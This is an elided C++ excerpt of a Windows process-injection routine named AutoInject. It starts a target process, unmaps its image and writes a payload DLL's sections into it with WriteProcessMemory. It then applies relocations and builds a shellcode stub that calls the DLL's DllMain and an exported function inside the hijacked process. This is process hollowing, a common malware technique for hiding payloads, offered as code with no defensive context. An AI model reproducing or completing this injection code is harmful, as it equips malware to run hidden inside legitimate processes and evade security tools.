...
DWORD ConvertVirtualAddressToRawAddress(DWORD virtual_address, LPVOID file)
{
	...
	while (virtual_address > section->VirtualAddress + section->Misc.VirtualSize) section++;
...
int Tools::AutoInject(LPSTR target, LPCSTR payload) 
{
	...
	if (process_created == TRUE)
	{
		...
		if (target_process != INVALID_HANDLE_VALUE)
		{
			...
			NtQueryInformationProcess(target_process, ProcessBasicInformation, (PVOID)process_basic_information, sizeof(PROCESS_BASIC_INFORMATION), &return_length);
					...
					if (dll_buffer != ERROR)
					{
						...
						if (dll_read == TRUE)
						{
							...
							if (NT_SUCCESS(unmap_section(target_process, destination_image_base)))
							{
								...
								PIMAGE_SECTION_HEADER dll_image_section_header = (PIMAGE_SECTION_HEADER)((DWORD)dll_buffer + dll_image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
								...
								for (int i = 0; i < dll_image_nt_headers->FileHeader.NumberOfSections; i++)
								{
									...
									PVOID source_section_loaction = (PVOID)((DWORD)dll_buffer + dll_image_section_header->PointerToRawData);
									WriteProcessMemory(target_process, destination_section_location, source_section_loaction, dll_image_section_header->SizeOfRawData, NULL);
									dll_image_section_header++;
								}

								//get the FunEntry exported function address
								...
								for (int x = 0; x < dll_image_nt_headers->FileHeader.NumberOfSections; x++)
								{
									...
									while (relocation_offset < relocation_table.Size)
									{
										...
										relocation_offset += sizeof(BASE_RELOCATION_BLOCK);
								...
								//eax is for 32bit and rax is for 64bit
								...
								//code for executing DllMain when the dll is inside the target process
								BYTE code[] =
								{
								...
								*((PDWORD)(code + 1)) = 0; //3rd param from DllMain
								*((PDWORD)(code + 6)) = 1; //2nd param from DllMain
								*((PDWORD)(code + 11)) = (DWORD)destination_image_base; //1nd param from DllMain
								*((PDWORD)(code + 16)) = (DWORD)destination_image_base + pEAT[1]; //exported function
